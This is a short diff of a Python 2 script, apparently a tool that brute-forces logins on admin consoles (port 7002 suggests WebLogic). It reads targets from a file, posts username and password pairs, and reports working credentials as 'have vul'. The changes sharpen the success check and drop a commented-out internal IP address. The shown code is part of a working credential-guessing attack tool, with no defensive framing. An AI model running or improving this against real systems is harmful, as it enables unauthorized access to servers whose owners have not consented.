@@ -22,8 +22,9 @@ def brute_force(ip_port):
                 s = req.Session()
                 r = s.post(url, data=payload, timeout=5)
 
-                if re.search('domain', r.text):
-                    print "%s: %s/%s" % (url, uname, pwd)
+                if re.search('Console', r.text) and re.search('Domain', r.text):
+                    #print r.text
+                    print "%s have vul: %s:%s" % (url,uname, pwd)
             except Exception, e:
                 print e
 
@@ -31,7 +32,6 @@ def brute_force(ip_port):
 if __name__ == '__main__':
 
     urls = []
-    #urls.append(['10.223.57.108','7002'])
 
     for line in open(sys.argv[1]):
         line = line.strip('\n')
